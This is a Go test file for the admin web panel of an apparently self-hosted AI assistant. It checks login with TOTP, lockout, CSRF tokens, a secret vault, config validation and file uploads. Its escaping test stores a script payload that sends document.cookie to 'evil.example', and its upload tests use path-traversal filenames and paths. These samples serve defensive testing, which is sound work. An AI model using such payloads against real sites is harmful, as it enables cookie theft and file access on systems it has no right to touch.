package admin

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"mime/multipart"
	"net/http"
	"net/http/cookiejar"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"

	"golang.org/x/crypto/bcrypt"

	"github.com/xiguac/atomhelper/internal/channel"
	"github.com/xiguac/atomhelper/internal/config"
	"github.com/xiguac/atomhelper/internal/core"
	"github.com/xiguac/atomhelper/internal/event"
	"github.com/xiguac/atomhelper/internal/llm"
	"github.com/xiguac/atomhelper/internal/seal"
	"github.com/xiguac/atomhelper/internal/store/pg"
	"github.com/xiguac/atomhelper/internal/team"
	"github.com/xiguac/atomhelper/internal/vault"
)

func TestCheckAddr_不是本机就必须有TLS(t *testing.T) {
	for addr, tls := range map[string]bool{"127.0.0.1:8780": false, "localhost:8780": false, "[::1]:8780": false, "0.0.0.0:443": true} {
		if err := CheckAddr(addr, tls); err != nil {
			t.Errorf("%s tls=%v 应被允许: %v", addr, tls, err)
		}
	}
	for _, addr := range []string{"0.0.0.0:8780", "118.195.207.111:8780", ":8780", "example.com:80"} {
		if err := CheckAddr(addr, false); err == nil {
			t.Errorf("%s 没有 TLS 应被拒绝", addr)
		}
	}
	if _, err := HashPassword("short"); err == nil {
		t.Fatal("过短的口令应被拒绝")
	}
}

const password = "correct horse battery"

type env struct {
	t      *testing.T
	srv    *httptest.Server
	client *http.Client
	store  *pg.Store
	vault  *vault.Vault
	cfg    string
	work   string
	csrf   string
	// server 与 clock 让测试能拨动后台看到的时间：动态验证码是按时间算的，而且每个只能用一次。
	server *Server
	clock  time.Time
	// secret 是 login 时绑定的验证器种子。
	secret string
}

// setup 需要真实数据库，设置 ATOM_TEST_DSN 后运行。
func setup(t *testing.T) *env {
	t.Helper()
	dsn := os.Getenv("ATOM_TEST_DSN")
	if dsn == "" {
		t.Skip("未设置 ATOM_TEST_DSN，跳过管理后台测试")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	st, err := pg.Open(ctx, dsn, seal.TestBox())
	if err != nil {
		t.Fatalf("连接失败: %v", err)
	}
	t.Cleanup(st.Close)
	if err := st.ResetForTest(ctx); err != nil {
		t.Fatalf("重置失败: %v", err)
	}
	if err := st.Migrate(ctx); err != nil {
		t.Fatalf("迁移失败: %v", err)
	}
	key, _ := vault.GenerateKey()
	safe, err := vault.Open(st.Vault(), key)
	if err != nil {
		t.Fatal(err)
	}
	dir := t.TempDir()
	e := &env{t: t, store: st, vault: safe, cfg: filepath.Join(dir, "config.yaml"), work: filepath.Join(dir, "files")}
	if err := os.WriteFile(e.cfg, []byte("files:\n  dir: "+filepath.ToSlash(e.work)+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	hash, err := HashPassword(password)
	if err != nil {
		t.Fatal(err)
	}
	s, err := New(Options{
		Store: st, Vault: safe, ConfigPath: e.cfg, PasswordHash: hash,
		Tasks:  &channel.Kernel{Store: st, Bus: event.NewBus(st.Events(), st), Budget: core.DefaultBudget()},
		Status: func() string { return "" },
		Log:    slog.New(slog.NewTextHandler(io.Discard, nil)),
	})
	if err != nil {
		t.Fatalf("构造后台失败: %v", err)
	}
	e.server, e.clock = s, time.Now()
	s.now = func() time.Time { return e.clock }
	e.srv = httptest.NewServer(s.Handler())
	t.Cleanup(e.srv.Close)
	jar, _ := cookiejar.New(nil)
	e.client = &http.Client{Jar: jar, CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	return e
}

func (e *env) get(path string) (int, string) {
	e.t.Helper()
	resp, err := e.client.Get(e.srv.URL + path)
	if err != nil {
		e.t.Fatal(err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(body)
}

func (e *env) post(path string, form url.Values) (int, string) {
	e.t.Helper()
	resp, err := e.client.PostForm(e.srv.URL+path, form)
	if err != nil {
		e.t.Fatal(err)
	}
	defer resp.Body.Close()
	// 跳转地址里带着结果，一并返回方便断言。
	loc, _ := url.QueryUnescape(resp.Header.Get("Location"))
	body, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, loc + string(body)
}

var reCSRF = regexp.MustCompile(`name="csrf" value="([0-9a-f]{64})"`)

var (
	reSecret = regexp.MustCompile(`class="box mono secret">([A-Z2-7]+)<`)
	reTicket = regexp.MustCompile(`name="ticket" value="([^"]+)"`)
)

// login 走一遍刚装好时的流程：先凭密码进来，绑定验证器，之后才能用后台。
func (e *env) login() {
	e.t.Helper()
	if code, loc := e.post("/login", url.Values{"password": {password}}); code != http.StatusSeeOther || !strings.Contains(loc, "/security") {
		e.t.Fatalf("首次登录应成功并跳去设置登录方式，实际 %d %s", code, loc)
	}
	_, body := e.get("/security")
	m := reCSRF.FindStringSubmatch(body)
	if m == nil {
		e.t.Fatal("页面里应有防伪令牌")
	}
	e.csrf = m[1]
	e.post("/security/totp/start", url.Values{"csrf": {e.csrf}})
	_, body = e.get("/security")
	sec := reSecret.FindStringSubmatch(body)
	if sec == nil {
		e.t.Fatal("绑定验证器时页面上应有密钥")
	}
	e.secret = sec[1]
	if _, loc := e.post("/security/totp/confirm", url.Values{"csrf": {e.csrf}, "code": {e.code()}}); !strings.Contains(loc, "验证器已绑定") {
		e.t.Fatalf("绑定验证器失败: %s", loc)
	}
	if code, _ := e.get("/"); code != http.StatusOK {
		e.t.Fatalf("设置好登录方式后应能进入后台: %d", code)
	}
}

// code 给出验证器此刻显示的验证码。每取一次把时间往后拨一个周期：同一个验证码不能用第二次。
func (e *env) code() string {
	e.t.Helper()
	e.clock = e.clock.Add(totpPeriod)
	c, err := totpAt(e.secret, e.clock.Unix()/int64(totpPeriod/time.Second))
	if err != nil {
		e.t.Fatal(err)
	}
	return c
}

func newClient() *http.Client {
	jar, _ := cookiejar.New(nil)
	return &http.Client{Jar: jar, CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
}

// signIn 用密码和动态验证码走完两步登录，返回第二步的状态码和页面。code 为空时用当前正确的验证码。
func (e *env) signIn(c *http.Client, pw, code string) (int, string) {
	e.t.Helper()
	resp, err := c.PostForm(e.srv.URL+"/login", url.Values{"password": {pw}})
	if err != nil {
		e.t.Fatal(err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	m := reTicket.FindStringSubmatch(string(body))
	if resp.StatusCode != http.StatusOK || m == nil {
		return resp.StatusCode, string(body)
	}
	if code == "" {
		code = e.code()
	}
	resp, err = c.PostForm(e.srv.URL+"/login/code", url.Values{"ticket": {m[1]}, "code": {code}})
	if err != nil {
		e.t.Fatal(err)
	}
	defer resp.Body.Close()
	body, _ = io.ReadAll(resp.Body)
	return resp.StatusCode, string(body)
}

func TestAdmin_不登录什么都看不到(t *testing.T) {
	e := setup(t)
	for _, path := range []string{"/", "/vault", "/memory", "/config", "/files", "/tasks/x", "/files/download?path=a"} {
		if code, body := e.get(path); code != http.StatusSeeOther || strings.Contains(body, "保险库") {
			t.Errorf("%s 未登录应跳去登录页，实际 %d", path, code)
		}
	}
	if code, _ := e.post("/vault", url.Values{"label": {"x"}, "value": {"y"}}); code != http.StatusSeeOther {
		t.Fatalf("未登录不能写保险库: %d", code)
	}
	if metas, _ := e.vault.List(context.Background()); len(metas) != 0 {
		t.Fatal("未登录的请求不应写入任何东西")
	}
	// 健康检查不用登录，但也不透露任何细节。
	code, body := e.get("/healthz")
	if code != 200 || !strings.Contains(body, `"ok":true`) {
		t.Fatalf("健康检查不对: %d %s", code, body)
	}

	// 口令连续输错会被锁住，这时连对的口令也进不去。
	for i := 0; i < maxFailures; i++ {
		if code, _ := e.post("/login", url.Values{"password": {"wrong"}}); code != http.StatusUnauthorized {
			t.Fatalf("错的口令应被拒绝: %d", code)
		}
	}
	if code, _ := e.post("/login", url.Values{"password": {password}}); code != http.StatusTooManyRequests {
		t.Fatalf("连续输错后应暂时锁住: %d", code)
	}
}

func TestAdmin_改动要带防伪令牌保险库只进不出(t *testing.T) {
	e := setup(t)
	e.login()
	ctx := context.Background()

	// 登录了但没带令牌（别的网页替你提交的表单就是这样）：拒绝。
	if code, _ := e.post("/vault", url.Values{"label": {"x"}, "value": {"y"}}); code != http.StatusForbidden {
		t.Fatalf("没带防伪令牌应被拒绝: %d", code)
	}
	if code, _ := e.post("/vault", url.Values{"csrf": {strings.Repeat("0", 64)}, "label": {"x"}, "value": {"y"}}); code != http.StatusForbidden {
		t.Fatalf("令牌不对应被拒绝: %d", code)
	}

	const secret = "sk-9f8e7d6c5b4a-very-secret"
	code, loc := e.post("/vault", url.Values{"csrf": {e.csrf}, "label": {"deepseek"}, "note": {"模型密钥"},
		"value": {secret + "\r\n"}, "tools": {"provider.deepseek，connector.mail"}})
	if code != http.StatusSeeOther || !strings.Contains(loc, "已保存") {
		t.Fatalf("存入失败: %d %s", code, loc)
	}
	metas, _ := e.vault.List(ctx)
	if len(metas) != 1 || strings.Join(metas[0].AllowedTools, ",") != "connector.mail,provider.deepseek" {
		t.Fatalf("条目或授权名单不对: %+v", metas)
	}
	// 存进去的值能被授权的工具取到，而且结尾的换行已经去掉。
	take, _ := e.vault.Lend("vault://deepseek", "provider.deepseek")
	if got, err := take(ctx); err != nil || got != secret {
		t.Fatalf("授权的工具应取得到原值: %q %v", got, err)
	}
	// 后台的任何页面上都看不到它。
	for _, path := range []string{"/vault", "/", "/config", "/memory"} {
		if _, body := e.get(path); strings.Contains(body, secret) {
			t.Fatalf("%s 页面上出现了保险库的内容", path)
		}
	}
	if code, _ := e.post("/vault/delete", url.Values{"csrf": {e.csrf}, "label": {"deepseek"}}); code != http.StatusSeeOther {
		t.Fatalf("删除失败: %d", code)
	}
	if metas, _ := e.vault.List(ctx); len(metas) != 0 {
		t.Fatal("删除后不应还在")
	}

	// 退出之后原来的会话作废。
	e.post("/logout", url.Values{"csrf": {e.csrf}})
	if code, _ := e.get("/vault"); code != http.StatusSeeOther {
		t.Fatalf("退出后应回到登录页: %d", code)
	}
}

func TestAdmin_任务与外部内容的转义(t *testing.T) {
	e := setup(t)
	e.login()
	ctx := context.Background()

	code, loc := e.post("/tasks", url.Values{"csrf": {e.csrf}, "goal": {"下周五下午三点跟供应商开会，记一下。地点 3 号会议室"}})
	if code != http.StatusSeeOther || !strings.HasPrefix(loc, "/tasks/") {
		t.Fatalf("建任务失败: %d %s", code, loc)
	}
	id := strings.TrimPrefix(loc, "/tasks/")
	task, err := e.store.GetTask(ctx, id)
	if err != nil || task.Origin != core.TrustUser || task.State != core.StateReady || task.Title != "下周五下午三点跟供应商开会，记一下" {
		t.Fatalf("后台建的任务应是用户等级、已入队，标题取第一句: %+v %v", task, err)
	}

	// 不是 UTF-8 的输入在门口就拦下，不让它到数据库里才报错。
	if code, _ := e.post("/tasks", url.Values{"csrf": {e.csrf}, "goal": {string([]byte{0xc3, 0xf7, 0xcc, 0xec})}}); code != http.StatusBadRequest {
		t.Fatalf("不是 UTF-8 的输入应被拒绝: %d", code)
	}

	// 一封邮件的内容进了步骤输出。它在页面上只能是文字，不能变成网页代码。
	step := core.NewStep(id, 1, core.StepTool, json.RawMessage(`{"id":"1.1@INBOX"}`))
	step.ToolName, step.Status, step.OutputTrust = "mail.read", core.StepDone, core.TrustExternal
	step.Output = json.RawMessage(`{"text":"<script>fetch('https://evil.example/?c='+document.cookie)</script><img src=x onerror=alert(1)>"}`)
	if err := e.store.AppendStep(ctx, step); err != nil {
		t.Fatal(err)
	}
	_, body := e.get("/tasks/" + id)
	if strings.Contains(body, "<script>fetch") || strings.Contains(body, "<img src=x") {
		t.Fatal("外部内容里的标签必须被转义")
	}
	// 输出是按 JSON 展示的，尖括号在里面写成反斜杠加 u003c 的形式；无论哪种写法，内容本身要看得到。
	if !strings.Contains(body, "&lt;script&gt;") && !strings.Contains(body, "u003cscript") {
		t.Fatalf("转义后的内容应仍能看到: %s", body[strings.Index(body, "做过的步骤"):])
	}
	if !strings.Contains(body, "外部内容") {
		t.Fatal("来自外部的步骤应有标记")
	}

	// 等确认的动作：完整展示参数，批准后继续。
	wait := core.NewStep(id, 2, core.StepTool, json.RawMessage(`{"to":["liwei@example.com"],"body":"收到，周五见"}`))
	wait.ToolName, wait.Status, wait.SideEffect = "mail.send", core.StepAwaiting, core.SideEffectIrreversible
	if err := e.store.AppendStep(ctx, wait); err != nil {
		t.Fatal(err)
	}
	task, _ = e.store.GetTask(ctx, id)
	task.Wake = &core.WakeCondition{Kind: core.WakeApproval, Ref: wait.ID}
	task.NextSeq = 3
	_ = e.store.Transition(ctx, id, core.StateReady, core.StateRunning, "测试")
	if err := e.store.UpdateTaskRuntime(ctx, task); err != nil {
		t.Fatal(err)
	}
	if err := e.store.Transition(ctx, id, core.StateRunning, core.StateWaiting, "等待用户确认：mail.send"); err != nil {
		t.Fatal(err)
	}
	_, body = e.get("/tasks/" + id)
	if !strings.Contains(body, "待确认操作：") || !strings.Contains(body, ">mail.send</span>") || !strings.Contains(body, "不可撤销") || !strings.Contains(body, "收到，周五见") || !strings.Contains(body, "liwei@example.com") {
		t.Fatalf("应完整展示等确认的动作:\n%s", body)
	}
	if _, home := e.get("/"); !strings.Contains(home, `待处理 <span class="count warn">1</span>`) || !strings.Contains(home, "待确认：") {
		t.Fatal("首页应把它列在等你处理里")
	}
	if code, loc := e.post("/tasks/"+id+"/approve", url.Values{"csrf": {e.csrf}}); code != http.StatusSeeOther || !strings.Contains(loc, "已批准") {
		t.Fatalf("批准失败: %d %s", code, loc)
	}
	steps, _ := e.store.ListSteps(ctx, id)
	if steps[1].Status != core.StepApproved {
		t.Fatalf("批准后这一步应标为已批准: %s", steps[1].Status)
	}
}

func TestAdmin_配置校验与文件(t *testing.T) {
	e := setup(t)
	e.login()

	// 有错的配置一个字都不写进去。
	before, _ := os.ReadFile(e.cfg)
	for name, bad := range map[string]string{
		"拼错的字段":   "filez:\n  dir: /tmp\n",
		"密钥写了明文":  "providers:\n  - {name: d, base_url: 'https://x', api_key: sk-abcdef}\n",
		"不是 YAML": "::: [",
	} {
		code, loc := e.post("/config", url.Values{"csrf": {e.csrf}, "text": {bad}})
		if code != http.StatusSeeOther || !strings.Contains(loc, "未保存") {
			t.Errorf("%s: 应被拒绝: %d %s", name, code, loc)
		}
		if now, _ := os.ReadFile(e.cfg); !bytes.Equal(now, before) {
			t.Fatalf("%s: 校验不过时配置文件不应被改动", name)
		}
	}
	good := string(before) + "reply:\n  style: balanced\nproviders:\n  - {name: deepseek, base_url: 'https://api.deepseek.com', api_key: 'vault://deepseek'}\n"
	if code, loc := e.post("/config", url.Values{"csrf": {e.csrf}, "text": {strings.ReplaceAll(good, "\n", "\r\n")}}); code != http.StatusSeeOther || !strings.Contains(loc, "已保存") {
		t.Fatalf("合法的配置应保存: %d %s", code, loc)
	}
	if now, _ := os.ReadFile(e.cfg); string(now) != good {
		t.Fatalf("保存的内容不对（换行应统一）: %q", now)
	}
	if bak, _ := os.ReadFile(e.cfg + ".bak"); !bytes.Equal(bak, before) {
		t.Fatal("旧配置应留一个备份")
	}
	if _, body := e.get("/config"); !strings.Contains(body, "style: balanced") {
		t.Fatal("配置页应显示当前的配置")
	}

	// 上传：浏览器给的文件名里带路径也只认最后一段，出不了工作区。
	upload := func(filename, dir, content string) (int, string) {
		var buf bytes.Buffer
		mw := multipart.NewWriter(&buf)
		_ = mw.WriteField("csrf", e.csrf)
		_ = mw.WriteField("dir", dir)
		fw, _ := mw.CreateFormFile("file", filename)
		_, _ = fw.Write([]byte(content))
		_ = mw.Close()
		resp, err := e.client.Post(e.srv.URL+"/files", mw.FormDataContentType(), &buf)
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()
		loc, _ := url.QueryUnescape(resp.Header.Get("Location"))
		return resp.StatusCode, loc
	}
	if code, loc := upload(`..\..\evil.txt`, "", "x"); code != http.StatusSeeOther || !strings.Contains(loc, "文件已保存至工作区: evil.txt") {
		t.Fatalf("文件名里的路径应被去掉: %d %s", code, loc)
	}
	if _, err := os.Stat(filepath.Join(filepath.Dir(e.work), "evil.txt")); err == nil {
		t.Fatal("文件不应落到工作区之外")
	}
	if code, loc := upload("销售.csv", "../outside", "x"); !strings.Contains(loc, "e=") {
		t.Fatalf("目录跳出工作区应被拒绝: %d %s", code, loc)
	}
	if code, loc := upload("销售.csv", "报表", "产品,销量\nA,1\n"); code != http.StatusSeeOther || !strings.Contains(loc, "报表/销售.csv") {
		t.Fatalf("上传失败: %d %s", code, loc)
	}
	if _, body := e.get("/files?dir=报表"); !strings.Contains(body, "报表/销售.csv") {
		t.Fatal("文件页应列出刚上传的文件")
	}
	resp, err := e.client.Get(e.srv.URL + "/files/download?path=" + url.QueryEscape("报表/销售.csv"))
	if err != nil {
		t.Fatal(err)
	}
	raw, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if string(raw) != "产品,销量\nA,1\n" || !strings.HasPrefix(resp.Header.Get("Content-Disposition"), "attachment") {
		t.Fatalf("下载的内容或方式不对: %q %s", raw, resp.Header.Get("Content-Disposition"))
	}
	if code, _ := e.get("/files/download?path=" + url.QueryEscape("../config.yaml")); code != http.StatusNotFound {
		t.Fatalf("下载工作区之外的文件应被拒绝: %d", code)
	}
}

func TestAdmin_模型页填接口和密钥配协作模型并评价(t *testing.T) {
	e := setup(t)
	e.login()
	ctx := context.Background()

	// 一个假的模型接口：核对带来的密钥，回一句话。
	var gotAuth string
	fake := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotAuth = r.Header.Get("Authorization")
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, `{"model":"m1","choices":[{"message":{"content":"收到"}}],"usage":{"prompt_tokens":1,"completion_tokens":1}}`)
	}))
	defer fake.Close()

	// 配置里原有的内容和注释不能因为在这一页保存而丢掉。
	before, _ := os.ReadFile(e.cfg)
	if err := os.WriteFile(e.cfg, append([]byte("# 我自己写的注释\n"), before...), 0o600); err != nil {
		t.Fatal(err)
	}
	post := func(path string, form url.Values) string {
		t.Helper()
		form.Set("csrf", e.csrf)
		code, loc := e.post(path, form)
		if code != http.StatusSeeOther {
			t.Fatalf("%s 应跳转，实际 %d", path, code)
		}
		return loc
	}

	// 不是本机的明文接口、没填密钥的新服务：都不收。
	if loc := post("/models/provider", url.Values{"name": {"x"}, "base_url": {"http://example.com/v1"}, "key": {"k"}}); !strings.Contains(loc, "必须使用 https") {
		t.Fatalf("明文接口应被拒绝: %s", loc)
	}
	if loc := post("/models/provider", url.Values{"name": {"x"}, "base_url": {fake.URL}}); !strings.Contains(loc, "必须填写 API Key") {
		t.Fatalf("新服务没有密钥应被拒绝: %s", loc)
	}
	if loc := post("/models/provider", url.Values{"name": {"本地"}, "base_url": {fake.URL + "/"}, "key": {" sk-secret-1 "}}); !strings.Contains(loc, "模型服务「本地」已保存") {
		t.Fatalf("保存模型服务失败: %s", loc)
	}
	if loc := post("/models/main", url.Values{"provider": {"本地"}, "model": {"m1"}}); !strings.Contains(loc, "主 AI 已设置为") {
		t.Fatalf("保存主 AI 失败: %s", loc)
	}
	if loc := post("/models/agent", url.Values{"name": {"写手"}, "provider": {"本地"}, "model": {"m2"}, "good_at": {"writing", "translate"}}); !strings.Contains(loc, "协作模型「写手」已保存") {
		t.Fatalf("保存协作模型失败: %s", loc)
	}
	if loc := post("/models/agent", url.Values{"name": {"坏的"}, "provider": {"不存在"}, "model": {"m"}}); !strings.Contains(loc, "不存在") {
		t.Fatalf("引用不存在的服务应被拒绝: %s", loc)
	}

	raw, _ := os.ReadFile(e.cfg)
	text := string(raw)
	if strings.Contains(text, "sk-secret-1") {
		t.Fatal("密钥不能出现在配置文件里")
	}
	for _, want := range []string{"# 我自己写的注释", "files:", "api_key: vault://本地", "purpose: plan", "fallback:", "name: 写手", "- writing"} {
		if !strings.Contains(text, want) {
			t.Fatalf("配置里应有 %q:\n%s", want, text)
		}
	}
	file, err := config.LoadFile(e.cfg)
	if err != nil {
		t.Fatalf("保存出来的配置应能加载: %v", err)
	}
	router, err := file.BuildRouter(ctx, e.vault)
	if err != nil {
		t.Fatalf("保存出来的配置应能接通模型: %v", err)
	}
	if _, err := router.CompleteWith(ctx, "写手", llm.Request{Messages: []llm.Message{{Role: llm.RoleUser, Content: "hi"}}}); err != nil {
		t.Fatalf("协作模型应能调用: %v", err)
	}

	// 测试连接：用的是保险库里的密钥。
	if loc := post("/models/test", url.Values{"provider": {"本地"}, "model": {"m1"}}); !strings.Contains(loc, "连接成功") || gotAuth != "Bearer sk-secret-1" {
		t.Fatalf("测试连接应成功并带上密钥: %s %q", loc, gotAuth)
	}
	// 修改时留空密钥：密钥不变。在用的服务删不掉。
	if loc := post("/models/provider", url.Values{"name": {"本地"}, "base_url": {fake.URL}}); !strings.Contains(loc, "已保存") {
		t.Fatalf("留空密钥应保留原来的: %s", loc)
	}
	if loc := post("/models/provider/delete", url.Values{"name": {"本地"}}); !strings.Contains(loc, "正在使用中") {
		t.Fatalf("在用的服务不应能删: %s", loc)
	}
	_, body := e.get("/models")
	for _, want := range []string{"已配置", "写手", "尚无记录，优先试用", `value="m1"`} {
		if !strings.Contains(body, want) {
			t.Fatalf("模型页应有 %q", want)
		}
	}
	if strings.Contains(body, "sk-secret-1") {
		t.Fatal("模型页不能显示密钥")
	}

	// 任务页上评价协作模型交的活，成绩跟着变。
	task := core.NewTask("写周报", "写周报", core.TrustUser)
	if err := e.store.CreateTask(ctx, task); err != nil {
		t.Fatal(err)
	}
	work := &team.Work{ID: team.WorkID(task.ID, 1, 0), TaskID: task.ID, StepSeq: 1, Worker: "写手",
		Category: team.CatWriting, Title: "<b>周报</b>", CreatedAt: time.Now().UTC()}
	if err := e.store.Team().PutWork(ctx, work); err != nil {
		t.Fatal(err)
	}
	if _, body := e.get("/tasks/" + task.ID); !strings.Contains(body, "协作产出") || strings.Contains(body, "<b>周报</b>") {
		t.Fatal("任务页应列出协作成果，标题要转义")
	}
	if loc := post("/tasks/"+task.ID+"/rate", url.Values{"work": {"别的任务:1:0"}, "verdict": {"good"}}); !strings.Contains(loc, "不属于此任务") {
		t.Fatalf("不能评别的任务的活: %s", loc)
	}
	if loc := post("/tasks/"+task.ID+"/rate", url.Values{"work": {work.ID}, "verdict": {"bad"}}); !strings.Contains(loc, "评价已保存") {
		t.Fatalf("评价失败: %s", loc)
	}
	all, err := e.store.Team().Tally(ctx)
	if err != nil || len(all) != 1 || all[0].Bad != team.WeightUser || all[0].Runs != 1 {
		t.Fatalf("评价应记成一整票差评: %+v %v", all, err)
	}
	if _, body := e.get("/tasks/" + task.ID); !strings.Contains(body, "用户评价：不满意") {
		t.Fatal("任务页应显示已有的评价")
	}

	// 删掉协作模型再删服务：主 AI 还在用，仍然删不掉。
	if loc := post("/models/agent/delete", url.Values{"name": {"写手"}}); !strings.Contains(loc, "协作模型「写手」已删除") {
		t.Fatalf("删除协作模型失败: %s", loc)
	}
	if now, _ := os.ReadFile(e.cfg); strings.Contains(string(now), "agents:") {
		t.Fatalf("最后一个协作模型删掉后不应留下空的一节:\n%s", now)
	}
}

func TestAdmin_模型服务的接口协议(t *testing.T) {
	e := setup(t)
	e.login()
	// 一个按 Anthropic Messages 格式应答的假接口。
	var gotPath, gotKey string
	fake := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotPath, gotKey = r.URL.Path, r.Header.Get("x-api-key")
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, `{"model":"m","content":[{"type":"text","text":"收到"}],"usage":{"input_tokens":1,"output_tokens":1}}`)
	}))
	defer fake.Close()
	post := func(path string, form url.Values) string {
		t.Helper()
		form.Set("csrf", e.csrf)
		_, loc := e.post(path, form)
		return loc
	}

	if loc := post("/models/provider", url.Values{"name": {"a"}, "base_url": {fake.URL}, "key": {"k1"}, "protocol": {"grpc"}}); !strings.Contains(loc, "接口协议取值无效") {
		t.Fatalf("不认识的协议应被拒绝: %s", loc)
	}
	if loc := post("/models/provider", url.Values{"name": {"a"}, "base_url": {fake.URL}, "key": {"k1"}, "protocol": {"anthropic"}}); !strings.Contains(loc, "已保存") {
		t.Fatalf("保存失败: %s", loc)
	}
	// 之后只改地址、不选协议：协议沿用原来的。
	if loc := post("/models/provider", url.Values{"name": {"a"}, "base_url": {fake.URL + "/"}, "protocol": {""}}); !strings.Contains(loc, "已保存") {
		t.Fatalf("保存失败: %s", loc)
	}
	if raw, _ := os.ReadFile(e.cfg); !strings.Contains(string(raw), "protocol: anthropic") {
		t.Fatalf("协议应写进配置并在修改时保留:\n%s", raw)
	}
	if loc := post("/models/test", url.Values{"provider": {"a"}, "model": {"m"}}); !strings.Contains(loc, "连接成功") || gotPath != "/v1/messages" || gotKey != "k1" {
		t.Fatalf("应按 Anthropic 协议发起连接测试: %s %s %s", loc, gotPath, gotKey)
	}
	if _, body := e.get("/models"); !strings.Contains(body, "<td>Anthropic</td>") {
		t.Fatal("模型页应显示协议")
	}
	// 改回默认协议：配置里不留这一项。
	post("/models/provider", url.Values{"name": {"a"}, "base_url": {fake.URL}, "protocol": {"openai"}})
	if raw, _ := os.ReadFile(e.cfg); strings.Contains(string(raw), "protocol") {
		t.Fatalf("默认协议不应写进配置:\n%s", raw)
	}
}

func TestAdmin_渠道页接入机器人并指定主人(t *testing.T) {
	e := setup(t)
	e.login()
	post := func(path string, form url.Values) string {
		t.Helper()
		form.Set("csrf", e.csrf)
		_, loc := e.post(path, form)
		return loc
	}
	before, _ := os.ReadFile(e.cfg)

	if loc := post("/channels", url.Values{"name": {"qq"}, "type": {"qq"}, "app_id": {"1020"}}); !strings.Contains(loc, "必须填写 AppSecret") {
		t.Fatalf("新增渠道没有凭据应被拒绝: %s", loc)
	}
	if loc := post("/channels", url.Values{"name": {"wx"}, "type": {"wechat"}, "app_id": {"1"}, "secret": {"s"}}); !strings.Contains(loc, "不支持") {
		t.Fatalf("不支持的类型应被拒绝: %s", loc)
	}
	if loc := post("/channels", url.Values{"name": {"qq"}, "type": {"qq"}, "app_id": {"1020"}, "secret": {"app-secret-1"}, "sandbox": {"1"}}); !strings.Contains(loc, "已保存") {
		t.Fatalf("保存渠道失败: %s", loc)
	}
	raw, _ := os.ReadFile(e.cfg)
	text := string(raw)
	if strings.Contains(text, "app-secret-1") || !strings.HasPrefix(text, string(before)) ||
		!strings.Contains(text, "secret: vault://channel.qq") || !strings.Contains(text, "sandbox: true") {
		t.Fatalf("凭据应进保险库、配置里只留句柄，其余内容不动:\n%s", text)
	}
	// 保存渠道不会顺带指定主人：主人只能单独、明确地添加。
	file, err := config.LoadFile(e.cfg)
	if err != nil || len(file.Channels) != 1 || len(file.Channels[0].Owners) != 0 {
		t.Fatalf("新渠道不应有主人: %+v %v", file, err)
	}
	// 凭据授权给这个渠道自己，启动时取得出来。
	bindings, err := file.BuildChannels(e.vault, nil, slog.New(slog.NewTextHandler(io.Discard, nil)))
	if err != nil || len(bindings) != 1 {
		t.Fatalf("保存出来的渠道应能构造: %v", err)
	}
	if _, body := e.get("/channels"); !strings.Contains(body, "尚未指定主人") || !strings.Contains(body, "凭据已配置") || strings.Contains(body, "app-secret-1") {
		t.Fatal("渠道页应提示尚无主人，且不显示凭据")
	}

	if loc := post("/channels/owner", url.Values{"name": {"qq"}, "owner": {"有 空格"}}); !strings.Contains(loc, "不含空白字符") {
		t.Fatalf("带空白的标识应被拒绝: %s", loc)
	}
	post("/channels/owner", url.Values{"name": {"qq"}, "owner": {"OPENID-A"}})
	post("/channels/owner", url.Values{"name": {"qq"}, "owner": {"OPENID-B"}})
	post("/channels/owner", url.Values{"name": {"qq"}, "owner": {"OPENID-A"}}) // 重复添加不产生两条
	// 修改渠道（换 AppID、不填凭据）：主人名单和凭据都保留。
	if loc := post("/channels", url.Values{"name": {"qq"}, "type": {"qq"}, "app_id": {"2030"}}); !strings.Contains(loc, "已保存") {
		t.Fatalf("修改渠道失败: %s", loc)
	}
	post("/channels/owner", url.Values{"name": {"qq"}, "owner": {"OPENID-B"}, "remove": {"1"}})
	file, err = config.LoadFile(e.cfg)
	if err != nil || file.Channels[0].AppID != "2030" || file.Channels[0].Sandbox ||
		strings.Join(file.Channels[0].Owners, ",") != "OPENID-A" || file.Channels[0].Secret != "vault://channel.qq" {
		t.Fatalf("修改后的渠道不对: %+v %v", file.Channels, err)
	}

	if loc := post("/channels/delete", url.Values{"name": {"qq"}}); !strings.Contains(loc, "已删除") {
		t.Fatalf("删除渠道失败: %s", loc)
	}
	if now, _ := os.ReadFile(e.cfg); string(now) != string(before) {
		t.Fatalf("删除后配置应回到原样:\n%q\n%q", now, before)
	}
	// 不登录碰不到这些表单。
	fresh := &http.Client{CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	resp, err := fresh.PostForm(e.srv.URL+"/channels/owner", url.Values{"name": {"qq"}, "owner": {"X"}})
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusSeeOther || !strings.Contains(resp.Header.Get("Location"), "/login") {
		t.Fatalf("未登录应被引到登录页: %d", resp.StatusCode)
	}
}

func TestAdmin_连接器页配置日历邮件与节假日(t *testing.T) {
	e := setup(t)
	e.login()
	post := func(path string, form url.Values) string {
		t.Helper()
		form.Set("csrf", e.csrf)
		_, loc := e.post(path, form)
		return loc
	}
	before, _ := os.ReadFile(e.cfg)

	if loc := post("/connectors/calendar", url.Values{"url": {"https://caldav.example.com"}, "username": {"me@example.com"}}); !strings.Contains(loc, "必须填写密码") {
		t.Fatalf("首次配置没有密码应被拒绝: %s", loc)
	}
	if loc := post("/connectors/calendar", url.Values{"url": {"http://caldav.example.com"}, "username": {"me"}, "password": {"p"}}); !strings.Contains(loc, "https://") {
